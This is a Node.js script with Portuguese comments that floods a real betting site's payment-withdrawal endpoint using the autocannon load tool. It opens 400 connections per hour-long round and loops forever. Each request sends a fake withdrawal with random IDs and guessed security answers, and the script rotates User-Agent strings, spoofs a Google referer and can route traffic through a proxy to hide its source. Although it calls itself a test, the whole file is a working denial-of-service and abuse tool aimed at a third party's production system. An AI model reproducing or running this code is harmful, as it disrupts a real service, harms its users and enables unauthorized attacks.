const autocannon = require('autocannon');
const HttpProxyAgent = require('http-proxy-agent');

// Proxy (se quiser usar, coloque o endereço aqui. Senão, deixe como null)
const proxy = null; // Exemplo: 'http://user:pass@ip:port'

function gerarHeaders() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_0) AppleWebKit/605.1.15 Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/110.0.5481.65 Mobile Safari/537.36'
  ];
  const index = Math.floor(Math.random() * userAgents.length);
  return {
    'User-Agent': userAgents[index],
    'Content-Type': 'application/json',
    'Referer': 'https://google.com',
    'Accept': '*/*',
    'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8'
  };
}

function gerarPayload() {
  return JSON.stringify({
    publicPaymentId: 'fakeId_' + Math.random().toString(36).substring(7),
    securityQuestion: 'withdrawal_magnetar_question_one',
    securityAnswer: 'aaaaa' + Math.random().toString(36).substring(2, 8),
    amount: '1.00',
    currency: 'BRL',
    pmId: 'FAKE-PM-' + Math.floor(Math.random() * 100000)
  });
}

function iniciarTeste() {
  console.log(`\n🔥 Iniciando rodada às ${new Date().toLocaleTimeString()}`);

  const instance = autocannon({
    url: 'https://luck.bet.br/payment/withdrawals:create',
    method: 'POST',
    duration: 3600, // 1 hora
    connections: 400,
    pipelining: 1,
    headers: gerarHeaders(),
    requests: [
      {
        method: 'POST',
        setupRequest: (req) => {
          req.headers = gerarHeaders();
          req.body = gerarPayload();
          return req;
        }
      }
    ],
    ...(proxy && {
      setupClient: (client) => {
        client.agent = new HttpProxyAgent(proxy);
      }
    })
  }, finalizado);

  autocannon.track(instance, { renderProgressBar: true });
}

function finalizado(err, res) {
  if (err) {
    console.error('❌ Erro:', err);
  } else {
    console.log('\n✅ Rodada finalizada');
    console.log(`📈 Requisições/s: ${res.requests.average}`);
    console.log(`⏱️ Latência média: ${res.latency.average}ms`);
    console.log(`⚠️ Erros: ${res.errors}`);
  }

  setTimeout(iniciarTeste, 3000); 
}

iniciarTeste();
